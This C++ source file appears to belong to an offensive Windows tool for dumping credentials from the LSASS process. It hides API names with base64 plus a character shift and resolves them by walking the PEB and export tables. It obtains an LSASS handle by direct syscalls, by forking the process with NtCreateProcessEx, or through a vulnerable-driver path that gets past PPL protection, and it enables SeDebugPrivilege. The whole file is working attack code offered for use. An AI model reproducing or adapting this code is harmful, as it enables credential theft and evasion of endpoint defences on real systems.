#include "CPP_helpers.h"
#include <iostream>
#include <vector>
#include <map>
#include <stdio.h>

typedef BOOL(*_AdjustTokenPrivileges)(
	HANDLE            TokenHandle,
	BOOL              DisableAllPrivileges,
	PTOKEN_PRIVILEGES NewState,
	DWORD             BufferLength,
	PTOKEN_PRIVILEGES PreviousState,
	PDWORD            ReturnLength
	);

typedef BOOL(*_LookupPrivilegeValueW)(
	LPCWSTR lpSystemName,
	LPCWSTR lpName,
	PLUID   lpLuid
	);


typedef BOOL (*_TerminateProcess)(
 HANDLE hProcess,
 UINT   uExitCode
);

typedef struct _LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	DWORD SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	DWORD Flags;
	WORD LoadCount;
	WORD TlsIndex;
	LIST_ENTRY HashLinks;
	PVOID SectionPointer;
	DWORD CheckSum;
	DWORD TimeDateStamp;
	PVOID LoadedImports;
	PVOID EntryPointActivationContext;
	PVOID PatchInformation;
}LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

__forceinline DWORD CompareStrings(const char* StringA, const wchar_t* StringB)
{
	const char* szIterA = StringA; const wchar_t* szIterB = StringB;

	while (*szIterA) {
		if (*szIterA++ != *szIterB++)
			return 1;
	}

	return *szIterB;
}

void* GetModuleFromPEB(const wchar_t* wModuleName)
{
#if defined( _WIN64 )  
#define PEBOffset 0x60  
#define LdrOffset 0x18  
#define ListOffset 0x10  
	unsigned long long pPeb = __readgsqword(PEBOffset); // read from the GS register
#elif defined( _WIN32 )  
#define PEBOffset 0x30  
#define LdrOffset 0x0C  
#define ListOffset 0x0C  
	unsigned long pPeb = __readfsdword(PEBOffset);
#endif       
	pPeb = *reinterpret_cast<decltype(pPeb)*>(pPeb + LdrOffset);
	PLDR_DATA_TABLE_ENTRY pModuleList = *reinterpret_cast<PLDR_DATA_TABLE_ENTRY*>(pPeb + ListOffset);
	while (pModuleList->DllBase)
	{
		if (!wcscmp(pModuleList->BaseDllName.Buffer, wModuleName)) // Compare the dll name that we are looking for against the dll we are inspecting right now.
			return pModuleList->DllBase; // If found, return back the void* pointer
		pModuleList = reinterpret_cast<PLDR_DATA_TABLE_ENTRY>(pModuleList->InLoadOrderLinks.Flink);
	}
	return nullptr;
}

uintptr_t GetAPIFromPEBModule(void* hModule, const wchar_t* wAPIName)
{
#if defined( _WIN32 )   
	unsigned char* lpBase = reinterpret_cast<unsigned char*>(hModule);
	IMAGE_DOS_HEADER* idhDosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(lpBase);
	if (idhDosHeader->e_magic == 0x5A4D)
	{
#if defined( _M_IX86 )  
		IMAGE_NT_HEADERS32* inhNtHeader = reinterpret_cast<IMAGE_NT_HEADERS32*>(lpBase + idhDosHeader->e_lfanew);
#elif defined( _M_AMD64 )  
		IMAGE_NT_HEADERS64* inhNtHeader = reinterpret_cast<IMAGE_NT_HEADERS64*>(lpBase + idhDosHeader->e_lfanew);
#endif  
		if (inhNtHeader->Signature == 0x4550)
		{
			IMAGE_EXPORT_DIRECTORY* iedExportDirectory = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(lpBase + inhNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
			for (register unsigned int uiIter = 0; uiIter < iedExportDirectory->NumberOfNames; ++uiIter)
			{
				char* szNames = reinterpret_cast<char*>(lpBase + reinterpret_cast<unsigned long*>(lpBase + iedExportDirectory->AddressOfNames)[uiIter]);
				if (!CompareStrings(szNames, wAPIName))
				{
					unsigned short usOrdinal = reinterpret_cast<unsigned short*>(lpBase + iedExportDirectory->AddressOfNameOrdinals)[uiIter];
					return reinterpret_cast<uintptr_t>(lpBase + reinterpret_cast<unsigned long*>(lpBase + iedExportDirectory->AddressOfFunctions)[usOrdinal]);
				}
			}
		}
	}
#endif  
	return 0;
}


static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

std::wstring base64_decode(const std::wstring& in) {

	std::wstring out;

	std::vector<int> T(256, -1);
	for (int i = 0; i < 64; i++) T["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i]] = i;

	int val = 0, valb = -8;
	for (unsigned char c : in) {
		if (T[c] == -1) break;
		val = (val << 6) + T[c];
		valb += 6;
		if (valb >= 0) {
			out.push_back(char((val >> valb) & 0xFF));
			valb -= 8;
		}
	}
	return out;
}


std::wstring decrypt(std::wstring text_real = L"") {


	std::wstring dec_out;
	text_real = base64_decode(text_real);
	int i;
	for (i = 0; (i < text_real.size() && text_real[i] != '\0'); i++) {
		text_real[i] = (text_real[i] - 2);

	};
	dec_out = text_real;

	return dec_out;

}

EXTERN_C HANDLE open_driver();
EXTERN_C HANDLE open_handle(ULONGLONG processPid, HANDLE hProcExpDevice);

 HANDLE GetLsassHandle(DWORD lssass_pid, DWORD Method) {

	 HANDLE lsassHandle = 0;
	 HANDLE CurrentSnapshotProcess;

	 _TerminateProcess hTerminate = (_TerminateProcess)GetAPIFromPEBModule(GetModuleFromPEB(decrypt(L"TUdUUEdONTQwRk5O").c_str()), decrypt(L"Vmd0b2twY3ZnUnRxZWd1dQ==").c_str());


	 NTSTATUS status = 0;

	 //CreateProcessEx

	 // Normally get an LSASS Handle - without any tricks, only direct syscall



		 if (Method == 2) {

			 OBJECT_ATTRIBUTES ObjectAttributes;
			 InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
			 CLIENT_ID uPid = { 0 };

			 uPid.UniqueProcess = (HANDLE)lssass_pid;
			 uPid.UniqueThread = 0;


			 CurrentSnapshotProcess = NULL;

			 status = _NtOpenProcess(&lsassHandle, PROCESS_CREATE_PROCESS, &ObjectAttributes, &uPid);
			 if (status) {

				 printf("failed with error 0x%x\n", status);

				 return FALSE;

			 }
			 else
				 printf("OMG Amazing!\n");

			 BOOL cleanSuccess;

			 cleanSuccess = TRUE;

			 if (CurrentSnapshotProcess)
			 {
				 cleanSuccess = hTerminate(CurrentSnapshotProcess, 0);
				 CloseHandle(CurrentSnapshotProcess);
				 if (cleanSuccess == FALSE)
				 {
					 return FALSE;
				 }

				 CurrentSnapshotProcess = NULL;
			 }


			 status = _NtCreateProcessEx(&CurrentSnapshotProcess, PROCESS_ALL_ACCESS, NULL, lsassHandle, 0, NULL, NULL, NULL, 0);

			 if (status) {

				 printf("failed with error 0x%x at stage 2\n", status);

				 return FALSE;
			 }
			 else
				 printf("Jackpot!\n");

			 return CurrentSnapshotProcess;

		 }



		 else if (Method == 1) {

			 OBJECT_ATTRIBUTES ObjectAttributes;
			 InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
			 CLIENT_ID uPid = { 0 };

			 uPid.UniqueProcess = (HANDLE)lssass_pid;
			 uPid.UniqueThread = 0;

			 status = _NtOpenProcess(&lsassHandle, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &ObjectAttributes, &uPid);
			 if (!status) {

				 wprintf(L"OMG amazing!!\n");
				 return lsassHandle;

			 }
		 }


		 else if (Method == 3) {

			 printf("[+] Trying driver mode handle\n");

			 HANDLE hProcExpDevice = open_driver();
			 lsassHandle = open_handle(lssass_pid, hProcExpDevice);
			 if (lsassHandle) {

				 printf("[+] omg got ppl handle!\n");
				 return lsassHandle;

			 }

		 }

		 else {

			 wprintf(L"[!] Failed  - Ask Omri. error 0x%x\n", status);
			 return 0;

		 }


	 printf("[-] Unable to obtain lsass handle");

}

 BOOL SetDebugPrivilege() {
	 HANDLE hToken = NULL;
	 PHANDLE tokloc = &hToken;
	 TOKEN_PRIVILEGES TokenPrivileges = { 0 };
	 NTSTATUS status;

	 _LookupPrivilegeValueW LookupPrivilegeValueW_F = (_LookupPrivilegeValueW)GetAPIFromPEBModule(GetModuleFromPEB(decrypt(L"Q0ZYQ1JLNTQwZm5u").c_str()), decrypt(L"TnFxbXdyUnRreGtuZ2lnWGNud2dZ").c_str());
	 _AdjustTokenPrivileges AdjustTokenPrivileges_F = (_AdjustTokenPrivileges)GetAPIFromPEBModule(GetModuleFromPEB(decrypt(L"Q0ZYQ1JLNTQwZm5u").c_str()), decrypt(L"Q2Zsd3V2VnFtZ3BSdGt4a25naWd1").c_str());
	 status = _NtOpenProcessToken((HANDLE)0xffffffffffffffff, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, tokloc);
	 if (status) {
		 printf("1, ERROR 0x%x\n", status);
		 return FALSE;
	 }

	 TokenPrivileges.PrivilegeCount = 1;
	 TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

	 LPWSTR lpwPriv = (LPWSTR)L"SeDebugPrivilege";
	 if (!LookupPrivilegeValueW_F(NULL, lpwPriv, &TokenPrivileges.Privileges[0].Luid)) {
		 std::cout << "2 failed\n";
		 CloseHandle(hToken);
		 return FALSE;
	 }

	 if (!AdjustTokenPrivileges_F(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		 std::cout << "3 failed\n";
		 CloseHandle(hToken);
		 return FALSE;
	 }

	 CloseHandle(hToken);

	// std::cout << "ALL GOOD got privs\n";
	 return TRUE;
 }


